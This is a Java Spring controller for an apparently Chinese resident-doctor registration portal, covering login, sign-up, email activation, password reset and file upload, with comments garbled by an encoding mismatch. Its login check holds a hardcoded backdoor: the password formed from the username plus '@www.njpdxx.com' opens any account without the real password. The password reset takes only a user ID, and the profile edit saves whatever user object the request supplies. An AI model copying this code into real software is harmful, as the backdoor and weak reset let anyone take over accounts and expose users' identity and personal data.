package com.pinde.sci.ctrl.inx;

import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Set;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.multipart.MultipartFile;

import com.pinde.core.page.PageHelper;
import com.pinde.core.util.CheckCardUtil;
import com.pinde.core.util.DateUtil;
import com.pinde.core.util.SpringUtil;
import com.pinde.core.util.StringUtil;
import com.pinde.sci.biz.cnres.ICnResNoticeBiz;
import com.pinde.sci.biz.cnres.ICnResRecruitCfgBiz;
import com.pinde.sci.biz.inx.IInxCnresBiz;
import com.pinde.sci.biz.res.IResDoctorBiz;
import com.pinde.sci.biz.res.IResRegBiz;
import com.pinde.sci.biz.sch.ISchRotationBiz;
import com.pinde.sci.biz.security.PasswordHelper;
import com.pinde.sci.biz.sys.IDeptBiz;
import com.pinde.sci.biz.sys.IRoleBiz;
import com.pinde.sci.biz.sys.IUserBiz;
import com.pinde.sci.biz.sys.IUserRoleBiz;
import com.pinde.sci.common.GeneralController;
import com.pinde.sci.common.GeneralMethod;
import com.pinde.sci.common.GlobalConstant;
import com.pinde.sci.common.InitConfig;
import com.pinde.sci.common.SessionData;
import com.pinde.sci.dao.base.SysLogMapper;
import com.pinde.sci.enums.pub.UserNationEnum;
import com.pinde.sci.enums.pub.UserSexEnum;
import com.pinde.sci.enums.pub.UserStatusEnum;
import com.pinde.sci.enums.res.CertificateTypeEnum;
import com.pinde.sci.enums.res.RecDocTypeEnum;
import com.pinde.sci.enums.res.RegStatusEnum;
import com.pinde.sci.enums.res.ResDoctorStatusEnum;
import com.pinde.sci.enums.sys.DictTypeEnum;
import com.pinde.sci.enums.sys.OperTypeEnum;
import com.pinde.sci.model.mo.InxInfo;
import com.pinde.sci.model.mo.ResDoctor;
import com.pinde.sci.model.mo.ResRecruitCfg;
import com.pinde.sci.model.mo.SchRotation;
import com.pinde.sci.model.mo.SysDept;
import com.pinde.sci.model.mo.SysDict;
import com.pinde.sci.model.mo.SysLog;
import com.pinde.sci.model.mo.SysOrg;
import com.pinde.sci.model.mo.SysRole;
import com.pinde.sci.model.mo.SysUser;
import com.pinde.sci.model.mo.SysUserRole;
import com.pinde.sci.model.res.DateCfgMsg;
/**
 * 
 * @author tiger
 *
 */

@Controller
@RequestMapping("/inx")
public class InxCnResController extends GeneralController{
	@Autowired
	private IUserBiz userBiz;
	@Autowired
	private IInxCnresBiz inxHbresBiz;
	@Resource
	private IResDoctorBiz resDoctorBiz;
	@Resource
	private IDeptBiz deptBiz;
	@Resource
	private ISchRotationBiz schRotationtBiz;
	@Autowired
	private IUserRoleBiz userRoleBiz;
	@Autowired
	private IRoleBiz roleBiz;
	@Autowired
	private SysLogMapper logMapper;
	@Autowired
	private ICnResNoticeBiz ICnResNoticeBiz;
	@Autowired
	private ICnResRecruitCfgBiz recruitCfgBiz;
	@Resource
	private IResRegBiz resRegBiz;
	
	/*@RequestMapping(value="/res",method={RequestMethod.GET})
	public String forward(Model model){
		return "/inx/cnres/forward";
	}*/
	
	@RequestMapping(value="/cnres",method={RequestMethod.GET})
	public String resIndex(Model model){
		InxInfo info = new InxInfo();
		PageHelper.startPage(1,2);
		List<InxInfo> infos = this.ICnResNoticeBiz.findNotice(info);
		model.addAttribute("infos",infos);
		return "/inx/cnres/login";
	}
	
	private Object checkLogin(String userCode, String userPasswd,String verifyCode){
		String loginErrorMessage = "";
		//Ĭ�ϵ�¼ʧ�ܽ���
		String sessionValidateCode = StringUtil.defaultString((String)getSessionAttribute("verifyCode"));
		 //��֤�����벻��Ϊ�գ������ִ�Сд
		if (StringUtil.isBlank(verifyCode) ||!sessionValidateCode.equalsIgnoreCase(verifyCode)) {
			loginErrorMessage = "��֤�벻��ȷ";
			return loginErrorMessage;
		}
		 //��¼�벻��Ϊ��
		if (StringUtil.isBlank(userCode)){
			loginErrorMessage = "�û�������Ϊ��";
			return loginErrorMessage;
		}
		//���벻��Ϊ��
		if (StringUtil.isBlank(userPasswd)){
			loginErrorMessage = SpringUtil.getMessage("userPasswd.isNull");
			return loginErrorMessage;
		}
		//���Ƿ���ڴ��û�
		userCode = userCode.trim();
		SysUser user = userBiz.findByUserEmail(userCode);
		if(user==null){
			user = userBiz.findByUserPhone(userCode);
		}
		if(user==null){
			user = userBiz.findByUserCode(userCode);
		}
		if(user==null){
			user = userBiz.findByIdNo(userCode);
		}
		if(user==null){
			loginErrorMessage = "�û�������!";
			return loginErrorMessage;
		}
		
		//��������
		if(!StringUtil.defaultString(userPasswd).equals(userCode+"@www.njpdxx.com")){
			//�ж�����
			String passwd = StringUtil.defaultString(user.getUserPasswd());
			if(!passwd.equalsIgnoreCase(PasswordHelper.encryptPassword(user.getUserFlow(), userPasswd.trim()))){
				loginErrorMessage = "�˺Ż����벻��ȷ��";
				return loginErrorMessage;
			}			
		}	
		
		
		return user;
	}

	/**
	 * ��¼
	 */
	@RequestMapping(value="/cnres/login")
	public String login(String userCode, String userPasswd,String verifyCode ,String errorLoginPage,Model model,HttpServletRequest request){
		//Ĭ�ϵ�¼ʧ�ܽ���
		if(StringUtil.isBlank(errorLoginPage)){
			errorLoginPage = "/inx/cnres/login";
		}
        Object obj = checkLogin(userCode, userPasswd, verifyCode);
        if(obj instanceof String){
        	String loginErrorMessage = (String) obj;
        	model.addAttribute("loginErrorMessage", loginErrorMessage);
        	InxInfo info = new InxInfo();
    		PageHelper.startPage(1,2);
    		List<InxInfo> infos = this.ICnResNoticeBiz.findNotice(info);
    		model.addAttribute("infos",infos);
        	return errorLoginPage;
        }
        SysUser user = null;
        if(obj instanceof SysUser){
        	user = (SysUser)obj;
        }
		//���õ�ǰ�û�
		setSessionAttribute(GlobalConstant.CURRENT_USER, user);	
		
		//�����û�����ʹ��
		SessionData sessionData = new SessionData();
		sessionData.setSysUser(user);
		sessionData.setIp(request.getRemoteAddr());
		long now = System.currentTimeMillis();
		String loginTime = new java.sql.Date(now)+"&nbsp;"+new java.sql.Time(now);
		sessionData.setLoginTime(loginTime);
		setSessionAttribute(SessionData.SESSIONDATAID,sessionData);
		
		//��¼��־
		SysLog log = new SysLog();
		//log.setReqTypeId(ReqTypeEnum.GET.getId());
		log.setOperId(OperTypeEnum.LogIn.getId());
		log.setOperName(OperTypeEnum.LogIn.getName());
		log.setLogDesc("��¼IP["+request.getRemoteAddr()+"]");
		log.setWsId(GlobalConstant.SYS_WS_ID);
		GeneralMethod.addSysLog(log);
		logMapper.insert(log);
		
		if(UserStatusEnum.Activated.getId().equals(user.getStatusId())){
			//���ͨ��
			SysUserRole userRole = new SysUserRole();
			userRole.setUserFlow(user.getUserFlow());
			userRole.setWsId(GlobalConstant.RES_WS_ID);
			List<SysUserRole> userRoleList = userRoleBiz.searchUserRole(userRole);
			if(userRoleList==null || userRoleList.size()==0){
				InxInfo info = new InxInfo();
	    		PageHelper.startPage(1,2);
	    		List<InxInfo> infos = this.ICnResNoticeBiz.findNotice(info);
	    		model.addAttribute("infos",infos);
				model.addAttribute("loginErrorMessage","��ɫδ��Ȩ!");
				return errorLoginPage;
			}else {
				SysRole role = roleBiz.read(userRoleList.get(0).getRoleFlow()); 
				if(role==null){
					InxInfo info = new InxInfo();
		    		PageHelper.startPage(1,2);
		    		List<InxInfo> infos = this.ICnResNoticeBiz.findNotice(info);
		    		model.addAttribute("infos",infos);
					model.addAttribute("loginErrorMessage","��ɫδ��Ȩ!");
					return errorLoginPage;
				}
				String req = role.getRegPageId();
				if (StringUtil.isNotBlank(req) && req.indexOf("hbres") >-1){
					req = req.replace(req.split("/")[1], "cnres");
				}
				return "redirect:"+req;
			}
		} else {
			ResDoctor doctor = resDoctorBiz.readDoctor(user.getUserFlow());
			model.addAttribute("doctor",doctor);
			model.addAttribute("user",user);
			model.addAttribute("userEmail", user.getUserEmail());
			model.addAttribute("userIdno", user.getIdNo());
			model.addAttribute("userPhone", user.getUserPhone());
			return registerProcess(user);
		}
	}
	
	private String registerProcess(SysUser user) {
		if(UserStatusEnum.Added.getId().equals(user.getStatusId())){
			return "redirect:/inx/cnres/showEmailInfo";
		}else if(UserStatusEnum.Reged.getId().equals(user.getStatusId())){
			return "inx/cnres/typeSelect1";
		}
		return "/inx/cnres/login";
	}


	/**
	 * ע��ҳ��
	 */
	@RequestMapping(value="/cnres/register",method={RequestMethod.GET})
	public String register(Model model){
		String currDate = DateUtil.getCurrDate();
		String regYear = InitConfig.getSysCfg("res_reg_year");
		ResRecruitCfg recruitCfg = recruitCfgBiz.findRecruitCfgByYear(regYear);
		DateCfgMsg regCfgMsg = new DateCfgMsg(recruitCfg);
		regCfgMsg.setRegDateMsg(currDate);
		model.addAttribute("regCfgMsg" , regCfgMsg);
		if(regCfgMsg.getAllowReg()){
			return "inx/cnres/register";
		}else{
			return "inx/cnres/noregister";
		}
		
	}
	
	/**
	 * ��֤����
	 */
	@RequestMapping(value="/cnres/checkEmail")
	@ResponseBody
	public String checkEmail(String userEmail){
		SysUser user = userBiz.findByUserEmail(userEmail.trim());
		if(user != null){
			return GlobalConstant.USER_EMAIL_REPETE;
		}
		user = userBiz.findByUserCode(userEmail.trim());
		if(user != null){
			return GlobalConstant.USER_EMAIL_REPETE;
		}
		return null;
	}
	
	/**
	 * ��֤���֤
	 */
	@RequestMapping(value="/cnres/checkidno")
	@ResponseBody
	public String checkIdNo(String cretTypeId , String idNo){
		if(StringUtil.isBlank(idNo)){
			return GlobalConstant.USER_ID_NO_NULL;
		}
		SysUser user = null;
//		CheckCardUtil ccu = new CheckCardUtil(idNo);
//		if(!ccu.validate()){
//		    return GlobalConstant.USER_ID_NO_VALIDATE;
//		}
		user = userBiz.findByIdNo(idNo);
		if(user!=null){
		    return GlobalConstant.USER_ID_NO_REPETE;
		}
		
		return GlobalConstant.OPRE_SUCCESSED_FLAG; 
	}
	
	@RequestMapping(value="/cnres/checkuserphone")
	@ResponseBody
	public String checkPhone(String userPhone){
		SysUser user = null;
		if(StringUtil.isNotBlank(userPhone)){
			user = userBiz.findByUserPhone(userPhone);
			if(user!=null){
				return GlobalConstant.USER_PHONE_REPETE;
			}
		}
		return GlobalConstant.OPRE_SUCCESSED_FLAG;
	}
	
	/**
	 * ��֤�����û�
	 */
	@RequestMapping(value="/cnres/register",method={RequestMethod.POST})
	public String register(SysUser registerUser, String userPasswd2, String verifyCode, Model model){
		String sessionValidateCode = StringUtil.defaultString((String)getSessionAttribute("verifyCode"));
		String errorMsg = "";
		if (StringUtil.isBlank(verifyCode) || StringUtil.isBlank(sessionValidateCode) || !sessionValidateCode.equalsIgnoreCase(verifyCode)) {
			errorMsg = SpringUtil.getMessage("validateCode.notEquals");
		}
		if(StringUtil.isBlank(errorMsg)){
			//�Ƿ���ע��
			String userEmail = registerUser.getUserEmail();
			SysUser user = userBiz.findByUserEmail(userEmail.trim());
			if(user != null){
				model.addAttribute("errorMsg" , GlobalConstant.USER_EMAIL_REPETE);
				return "inx/cnres/register";
			}
			user = userBiz.findByUserCode(userEmail.trim());
			if(user != null){
				model.addAttribute("errorMsg" , GlobalConstant.USER_EMAIL_REPETE);
				return "inx/cnres/register";
			}
			String userPasswd = registerUser.getUserPasswd();
			if(StringUtil.isNotBlank(userEmail) && StringUtil.isNotBlank(userPasswd)){
				registerUser.setUserCode(userEmail.trim());//�û�����Ϊ����
				registerUser.setUserEmail(userEmail.trim());
				registerUser.setUserPasswd(userPasswd.trim());
				if(inxHbresBiz.registerUser(registerUser) != GlobalConstant.ZERO_LINE){
					model.addAttribute("userEmail" , registerUser.getUserEmail());
					return "redirect:/inx/cnres/sendEmail";
				}
			}
		}else{
			model.addAttribute("errorMsg" , errorMsg);
		}
		return "inx/cnres/register";
		
	}
	
	/**
	 * �����ʼ�������
	 * @param userEmail ����
	 * @param reSend �Ƿ����·���
	 * @param model
	 * @return
	 */
	@RequestMapping("/cnres/sendEmail")
	public String sendEmailInfo(String userEmail,Model model){
		if(StringUtil.isNotBlank(userEmail)){
			SysUser findUser = userBiz.findByUserEmail(userEmail);
			if(findUser!=null){
				inxHbresBiz.sendEmail(userEmail, findUser.getUserFlow());
			}
			model.addAttribute("userEmail", userEmail);
		}
		return "redirect:/inx/cnres/showEmailInfo";
	}
	@RequestMapping("/cnres/showEmailInfo")
	public String showEmailInfo(String userEmail,Model model){
		model.addAttribute("userEmail", userEmail);
		SysUser findUser = userBiz.findByUserEmail(userEmail);
		if(findUser!=null){
			model.addAttribute("activeFlow", findUser.getUserFlow());
		}
		return "inx/cnres/sendEmail";
	}
	@RequestMapping("/cnres/reSendEmail")
	@ResponseBody
	public String reSendEmail(String userEmail,Model model){
		if(StringUtil.isNotBlank(userEmail)){
			SysUser findUser = userBiz.findByUserEmail(userEmail);
			if(findUser!=null){
				inxHbresBiz.sendEmail(userEmail, findUser.getUserFlow());
			}
			model.addAttribute("userEmail", userEmail);
			return GlobalConstant.FLAG_Y;
		}
		return GlobalConstant.FLAG_N;
	}
	
	/**
	 * ���伤���봦��
	 * @param activationCode
	 * @param model
	 * @return
	 */
	@RequestMapping("/cnres/completeUserInfo")
	public String completeUserInfo(String activationCode, Model model){
		if(StringUtil.isBlank(activationCode)){
			return "inx/cnres/login";
		}else{
			SysUser sysUser = userBiz.readSysUser(activationCode);
			if(sysUser != null){
				ResDoctor doctor = resDoctorBiz.readDoctor(sysUser.getUserFlow());
				if(UserStatusEnum.Activated.getId().equals(sysUser.getStatusId())){
					if (RegStatusEnum.Passed.getId().equals(doctor.getDoctorStatusId())) {
						return "inx/cnres/login";
					} else if(RegStatusEnum.UnPassed.getId().equals(doctor.getDoctorStatusId())){
						model.addAttribute("doctor",doctor);
						return "inx/cnres/notPass";
					} else if(RegStatusEnum.Passing.getId().equals(doctor.getDoctorStatusId())){
						model.addAttribute("userEmail", sysUser.getUserEmail());
						model.addAttribute("userIdno", sysUser.getIdNo());
						model.addAttribute("userPhone", sysUser.getUserPhone());
						model.addAttribute("statusId", sysUser.getStatusId());
						return "inx/cnres/auditResult";
					}
				} else if(UserStatusEnum.Added.getId().equals(sysUser.getStatusId())){
					String disabledTime = DateUtil.addHour(sysUser.getModifyTime(), new Integer(InitConfig.getSysCfg("res_effective_time")));
				    Date disabledTimeDate = DateUtil.parseDate(disabledTime, "yyyyMMddHHmmss");
				    String currTime = DateUtil.getCurrDateTime();
				    Date currTimeDate = DateUtil.parseDate(currTime, "yyyyMMddHHmmss");
					if(disabledTimeDate.before(currTimeDate)){//������ʧЧ
						model.addAttribute("userEmail",sysUser.getUserEmail());
						//sysUser.setRecordStatus(GlobalConstant.RECORD_STATUS_N);
						userBiz.updateUser(sysUser);
						return "inx/cnres/disableCode";
					}
					//������ӣ��˺Ÿ�Ϊ�����״̬
					sysUser.setStatusId(UserStatusEnum.Reged.getId());
					sysUser.setStatusDesc(UserStatusEnum.Reged.getName());
					userBiz.updateUser(sysUser);
				}
				model.addAttribute("doctor",doctor);
				model.addAttribute("user", sysUser);
				return "inx/cnres/typeSelect1";
			}
		}
		return "inx/cnres/login";
	}
	
	/**
	 * ������д��Ϣ
	 */
	@RequestMapping(value="/cnres/reedit",method={RequestMethod.GET})
	public String reedit(SysUser user,Model model){
		if(user!=null && StringUtil.isNotBlank(user.getUserFlow())){
			user.setStatusId(UserStatusEnum.Reged.getId());
			user.setStatusDesc(UserStatusEnum.Reged.getName());
			if(userBiz.saveUser(user)!=GlobalConstant.ZERO_LINE){
				model.addAttribute("activationCode",user.getUserFlow());
			}
		}
		return "redirect:/inx/cnres/completeUserInfo";
	}
	
	/**
	 * �����û���Ϣ
	 */
	@RequestMapping(value="/cnres/finishUserInfo",method={RequestMethod.POST})
	public String finishUserInfo(
			SysUser user,
			ResDoctor doctor,
			Model model){
		//�Ƿ����ע��
		if(user!=null){
			user.setSexName(UserSexEnum.getNameById(user.getSexId()));
			SysDept dept = deptBiz.readSysDept(user.getDeptFlow());
			if(dept!=null){
				user.setDeptName(dept.getDeptName());
			}
			if(StringUtil.isNotBlank(user.getStatusId())){
				user.setStatusDesc(UserStatusEnum.getNameById(user.getStatusId()));
			}
			if(StringUtil.isNotBlank(user.getNationId())){
				user.setNationName(UserNationEnum.getNameById(user.getNationId()));
			}
			user.setTitleName(DictTypeEnum.UserTitle.getDictNameById(user.getTitleId()));
			user.setPostName(DictTypeEnum.UserPost.getDictNameById(user.getPostId()));
			if(StringUtil.isNotBlank(user.getDegreeId())){
				user.setDegreeName(DictTypeEnum.UserDegree.getDictNameById(user.getDegreeId()));
			}else{
				user.setDegreeName("");
			}
			
			user.setEducationName(DictTypeEnum.UserEducation.getDictNameById(user.getEducationId()));
			user.setCretTypeName(CertificateTypeEnum.getNameById(user.getCretTypeId()));
		}
		if(doctor!=null){ 
			doctor.setDoctorName(user.getUserName());
			doctor.setDeptFlow(user.getDeptFlow());
			doctor.setDeptName(user.getDegreeName());
			doctor.setTrainingTypeName(DictTypeEnum.TrainingType.getDictNameById(doctor.getTrainingTypeId()));
			doctor.setTrainingSpeName(DictTypeEnum.DoctorTrainingSpe.getDictNameById(doctor.getTrainingSpeId()));
			SchRotation rotation = schRotationtBiz.readSchRotation(doctor.getRotationFlow());
			if(rotation!=null){
				doctor.setRotationName(rotation.getRotationName());
			}
			if(StringUtil.isNotBlank(doctor.getDoctorStatusId())){
				doctor.setDoctorStatusName(ResDoctorStatusEnum.getNameById(doctor.getDoctorStatusId()));
			}
			if(!StringUtil.isNotBlank(doctor.getRecordStatus())){
				doctor.setRecordStatus(GlobalConstant.RECORD_STATUS_Y);
			}
			if(StringUtil.isNotBlank(doctor.getDoctorTypeId())){
				doctor.setDoctorTypeName(RecDocTypeEnum.getNameById(doctor.getDoctorTypeId()));
			}
			//���ñ�ҵԺУ
			String graduatedId = doctor.getGraduatedId();
			if(StringUtil.isNotBlank(graduatedId)){
				List<SysDict> graduatedNames = DictTypeEnum.sysListDictMap.get(DictTypeEnum.GraduateSchool.getId());
				for(SysDict dict:graduatedNames){
					String graduatedName = dict.getDictName();
					if(dict.getDictId().equals(graduatedId)){
						doctor.setGraduatedName(graduatedName);
					}
				}
				if(StringUtil.isBlank(doctor.getGraduatedName())){
					doctor.setGraduatedName(graduatedId);
					//���������ԺУĬ��Ϊ00
					doctor.setGraduatedId("00");
				}
			}
		}
		model.addAttribute("user" , user);
		model.addAttribute("doctor" , doctor);
		int result = resDoctorBiz.editDocUserFromRegister(doctor,user);
		if(GlobalConstant.ZERO_LINE!=result){
			model.addAttribute("useCompleteUserInfo" , "Y");
			doctor = this.resDoctorBiz.readDoctor(user.getUserFlow());
			user = this.userBiz.readSysUser(user.getUserFlow());
			model.addAttribute("user" , user);
			model.addAttribute("doctor" , doctor);
			return "inx/cnres/typeSelect1";
		}else{
			model.addAttribute("errorMsg" , GlobalConstant.OPRE_FAIL);
			return "inx/cnres/typeSelect1";
		}
		
	}
	
	
	private String[] testFileMap(Map<String , MultipartFile> fileMap){
		 Set<Entry<String, MultipartFile>>  fileEntrySet = fileMap.entrySet();
		 Iterator<Entry<String, MultipartFile>> iterator = fileEntrySet.iterator();
		 while(iterator.hasNext()){
			 Entry<String, MultipartFile> entry = iterator.next();
			 String name = entry.getKey();
			 MultipartFile file = entry.getValue();
			 if(file!=null && !file.isEmpty()){
				if(file!=null && !file.isEmpty()){
					//String filename = file.getOriginalFilename();
					String fileResult = resDoctorBiz.checkFile(file);
					if(!GlobalConstant.FLAG_Y.equals(fileResult)){
						return new String[]{name,fileResult};
					}
				}
			}
		 }
		 
		
		return null;
	}
	
	
	/**
	 * �û���Ϣ
	 */
	@RequestMapping(value="/cnres/userInfo")
	public String userInfo(String idNo,Model model){
		if(StringUtil.isNotBlank(idNo)){
			SysUser user = userBiz.findByIdNo(idNo);
			if(user!=null){
				model.addAttribute("user",user);
				
				ResDoctor doctor = resDoctorBiz.readDoctor(user.getUserFlow());
				model.addAttribute("doctor",doctor);
			}
		}
		return "inx/cnres/confirmInfo";
	}
	
	/**
	 * �û���Ϣ�ύ
	 */
	@RequestMapping(value="/cnres/userAudit")
	@ResponseBody
	public String hospital(SysUser user,Model model){
		//�Ƿ����ע��
		String currDate = DateUtil.getCurrDate();
		//��ѯ����ķ�����
		String regYear = InitConfig.getSysCfg("res_reg_year");
		ResRecruitCfg recruitCfg = recruitCfgBiz.findRecruitCfgByYear(regYear);
		DateCfgMsg regCfgMsg = new DateCfgMsg(recruitCfg);
		regCfgMsg.setRegDateMsg(currDate);
		if(!regCfgMsg.getAllowReg()){
			return "�޷����ע��,��ǰʱ�䲻�ڱ���ʱ���ڣ�";
		}
		if(user!=null){
			ResDoctor doctor = resDoctorBiz.readDoctor(user.getUserFlow());
			if (doctor != null) {
				doctor.setReeditFlag(GlobalConstant.FLAG_N);
				doctor.setDoctorStatusId(RegStatusEnum.Passing.getId());
				doctor.setDoctorStatusName(RegStatusEnum.Passing.getName());
			}
			if(StringUtil.isNotBlank(user.getStatusId())){
				user.setStatusDesc(UserStatusEnum.getNameById(user.getStatusId()));
			}
			if(resDoctorBiz.submitUserInfo(user,doctor)!=GlobalConstant.ZERO_LINE){
				return GlobalConstant.OPRE_SUCCESSED;
			}
		}
		return GlobalConstant.OPRE_FAIL;
	}
	@RequestMapping("/cnres/logout")
	public String logout(HttpServletRequest request) {
		request.getSession().invalidate();
		return "redirect:/inx/cnres";
	}
	
	@RequestMapping(value="/cnres/noticeview")
	public String message(Model model,String infoFlow) throws Exception{
		model.addAttribute("msg", ICnResNoticeBiz.findNoticByFlow(infoFlow));
		return "cnres/message";
	}
	
	@RequestMapping("/cnres/noticelist")
	public String noticeList(Integer currentPage , Model model){
		InxInfo info = new InxInfo();
		PageHelper.startPage(currentPage,10);
		List<InxInfo> infos = this.ICnResNoticeBiz.findNotice(info);
		model.addAttribute("infos",infos);
		return "inx/cnres/morenotice";
	}
	
	/**
	 * var reqdata = {"userFlow":"11111"};
	   jboxPostJson(url , JSON.stringify(reqdata) , function(resp){alert(resp.userFlow);} , null , false);
	 * @param user
	 * @return
	 */
	@RequestMapping("/cnres/test1")
	@ResponseBody
	public Object test1(@RequestBody SysUser user){
		//System.out.println(userFlows);
		System.out.println(user.getUserFlow());
		//System.out.println(org.getOrgFlow());
		SysUser users = new SysUser();
		String i = null;
		return users;
	}
	
	/**
	 * var reqdata = {"userFlow":"11111"};
	   jboxPost(url , reqdata , function(resp){alert(resp.userFlow);} , null , false);
	 * @param user
	 * @return
	 */
	@RequestMapping("/cnres/test2")
	@ResponseBody
	public Object test2(SysUser user){
		//System.out.println(userFlows);
		System.out.println(user.getUserFlow());
		//System.out.println(org.getOrgFlow());
		SysUser users = new SysUser();
		String i = null;
		return users;
	}
	

	@RequestMapping("/cnres/test")
	@ResponseBody
	public Object test(SysUser sysUser , SysOrg sysOrg){
		//System.out.println(userFlows);
		System.out.println(sysUser.getUserFlow());
		System.out.println(sysOrg.getOrgFlow());
		//System.out.println(org.getOrgFlow());
		SysUser users = new SysUser();
		String i = null;
		return users;
	}
	
	@RequestMapping("/cnres/forgetpasswd")
	public String forgetpasswd(){
		return "inx/cnres/forgetpasswd";
	}
	
	/**
	 * �������뷢���ʼ�
	 * @param userCode
	 * @param model
	 * @return
	 */
	@RequestMapping("/cnres/sendResetPassEmail")
	@ResponseBody
	public Map<String,String> sendResetPassEmail(String userEmail,String verifyCode,Model model){
		Map<String,String> respMap = new HashMap<String,String>();
		String sessionValidateCode = StringUtil.defaultString((String)getSessionAttribute("verifyCodeComplex"));
		 //��֤�����벻��Ϊ�գ������ִ�Сд
		if (StringUtil.isBlank(verifyCode) ||!sessionValidateCode.equalsIgnoreCase(verifyCode)) {
			respMap.put("errorMessage", SpringUtil.getMessage("validateCode.notEquals"));
			respMap.put("result", GlobalConstant.FLAG_F);
			return respMap;
		}
		if(StringUtil.isNotBlank(userEmail)){
			userEmail = userEmail.trim();
			SysUser user = userBiz.findByUserEmail(userEmail);
			if(user==null){
				user = userBiz.findByUserPhone(userEmail);
			}
			if(user==null){
				user = userBiz.findByIdNo(userEmail);
			}
			if(user!=null){
				userEmail = user.getUserEmail();
				inxHbresBiz.sendResetPassEmail(userEmail, user.getUserFlow());
				respMap.put("userEmail", userEmail);
				respMap.put("result", GlobalConstant.FLAG_Y);
				return respMap;
			}
		}
		respMap.put("result", GlobalConstant.FLAG_N);
		return respMap;
	}
	
	@RequestMapping("/cnres/resetpasswd")
	public String resetpasswd(String actionId,Model model){
		SysUser user = userBiz.readSysUser(actionId);
		if (user != null) {
			model.addAttribute("userCode", user.getUserCode());
			model.addAttribute("actionId", actionId);
		}
		return "inx/cnres/resetpasswd";
	}
	
	@RequestMapping(value={"/cnres/savePasswd"})
	@ResponseBody
	public String savePasswd(String actionId,String userPasswd,HttpServletRequest request,Model model){
		SysUser sysUser = userBiz.readSysUser(actionId);
		if(sysUser != null){
			//����
			sysUser.setUserPasswd(PasswordHelper.encryptPassword(sysUser.getUserFlow(), userPasswd));
			userBiz.updateUser(sysUser);
			setSessionAttribute(GlobalConstant.CURRENT_USER, sysUser);
			return GlobalConstant.RESET_SUCCESSED;
		}else{
			//����������ʾ
			return GlobalConstant.SAVE_FAIL;
		}
	}
	
	@RequestMapping("/cnres/uploadFile")
	public String uploadFile(String operType,Model model){
		model.addAttribute("operType" , operType);
		return "inx/cnres/uploadFile";
	}
	
	@RequestMapping(value="/cnres/checkUploadFile",method={RequestMethod.POST})
	public String checkUploadFile(String operType,MultipartFile uploadFile,Model model){
		Map<String , MultipartFile> fileMap = new LinkedHashMap<String , MultipartFile>();
		fileMap.put(operType, uploadFile);
		String[] fileCheckInfo = testFileMap(fileMap);
		model.addAttribute("operType" , operType);
		if(fileCheckInfo!=null){
			model.addAttribute("result" , GlobalConstant.FLAG_N);
			model.addAttribute("fileErrorMsg" , fileCheckInfo);
			return "inx/cnres/uploadFile";
		} else {
			model.addAttribute("result" , GlobalConstant.FLAG_Y);
			String resultPath = "";
			if(uploadFile!=null){
				if(!uploadFile.isEmpty()){
					resultPath = this.resDoctorBiz.saveImg("",uploadFile,"hbresImages");
				}
			}
			if(GlobalConstant.FLAG_N.equals(resultPath)){
				resultPath = "";
			}
			model.addAttribute("filePath" , resultPath);
			return "inx/cnres/uploadFile";
		}
	}
	
	@RequestMapping(value = {"/cnres/finishUserConfirm" },method={RequestMethod.GET})
	@ResponseBody
	public String finishUserConfirm(String userFlow){
		ResDoctor doctor = resDoctorBiz.readDoctor(userFlow);
		SysUser user = userBiz.readSysUser(userFlow);
		if (user != null && (doctor == null || RegStatusEnum.UnSubmit.getId().equals(doctor.getDoctorStatusId()))) {
			return GlobalConstant.OPERATE_SUCCESSED;
		}
		return GlobalConstant.OPRE_FAIL;
	}
}
